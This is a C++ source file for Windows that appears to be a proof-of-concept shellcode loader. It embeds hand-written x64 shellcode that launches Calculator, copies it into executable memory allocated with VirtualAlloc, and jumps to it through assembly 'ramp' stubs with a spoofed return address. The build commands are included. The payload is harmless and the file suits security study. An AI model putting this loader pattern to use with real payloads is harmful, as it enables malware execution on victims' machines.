#include <stdio.h>
#include <windows.h>

//custom calc payload
unsigned char payload[] = "\x4C\x8D\x3C\x24\x48\x83\xC4\x08\x4C\x8D\x2C\x24\x48\x83\xEC\x20\x48\x31\xFF\x48\xF7\xE7\x65\x48\x8B\x58\x60\x48\x8B\x5B\x18\x48\x8B\x5B\x20\x48\x8B\x1B\x48\x8B\x1B\x48\x8B\x5B\x20\x49\x89\xD8\x8B\x5B\x3C\x4C\x01\xC3\x48\x31\xC9\x66\x81\xC1\xFF\x88\x48\xC1\xE9\x08\x8B\x14\x0B\x4C\x01\xC2\x4D\x31\xD2\x44\x8B\x52\x1C\x4D\x01\xC2\x4D\x31\xDB\x44\x8B\x5A\x20\x4D\x01\xC3\x4D\x31\xE4\x44\x8B\x62\x24\x4D\x01\xC4\xEB\x31\x59\x48\x31\xC0\x48\x89\xE2\x51\x48\x8B\x0C\x24\x48\x31\xFF\x41\x8B\x3C\x83\x4C\x01\xC7\x48\x89\xD6\xF3\xA6\x74\x05\x48\xFF\xC0\xEB\xE6\x59\x66\x41\x8B\x04\x44\x41\x8B\x04\x82\x4C\x01\xC0\xEB\x1B\x48\x31\xC9\x80\xC1\x07\x48\xB8\x0F\xA8\x96\x91\xBA\x87\x9A\x9C\x48\xF7\xD0\x48\xC1\xE8\x08\x50\x51\xEB\xB4\x49\x89\xC6\x48\x31\xC9\x48\xF7\xE1\x50\x48\xB8\x9C\x9E\x93\x9C\xD1\x9A\x87\x9A\x48\xF7\xD0\x50\x48\x89\xE1\x48\xFF\xC2\x48\x83\xEC\x20\x41\xFF\x37\x41\xFF\xE6";

size_t payload_len = sizeof(payload);

extern "C" void onRamp(PVOID exec_mem, PVOID ret_addr);
extern "C" void offRamp(void); 

PVOID return_address = NULL;

void FunctionTwo(void){
	//allocate memory
	auto exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	//move paylaod to our buffer
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	printf("Execute payload?\n");
	getchar(); 								//quasi-break-point
	
	//execute payload
    onRamp(exec_mem, return_address);
	return;
}

void FunctionOne(void){
	printf("FunctionOne!\n");
	getchar(); 								//quasi-break-point
	FunctionTwo();
	return;									
}

int main(void){
	printf("Entering main function...\n");
	
//get address and add the standard offset (post FunctionOne())
asm(".intel_syntax noprefix;"
	"lea rax, [rip];"
	"add rax, 0x13;"						//hardcoded offset
	"mov %0, rax;"
	:"=r"(return_address)
	:										//no source
	:"rax"); 								//clobber rax
	FunctionOne();
	printf("Exiting main function...\n");	//offRamp returns here
	//getchar();
	
	return 0;
}

//nasm -f win64 payload.asm -o payload.o
//nasm -f win64 ramp.asm -o ramp.o
//x86_64-w64-mingw32-g++.exe main_clean.cpp ramp.o -o main_clean.exe

//Function Prompt { "$( ( get-item $pwd ).Name )>" }

//Reference
    // asm("mov eax, %1;" %1 is input from source
    // "mov %0, eax;"     %0 is output to destination
    // :"=r"(dst)         destination
    // :"r"(src)          source
    // :"eax");           clobber register(s)
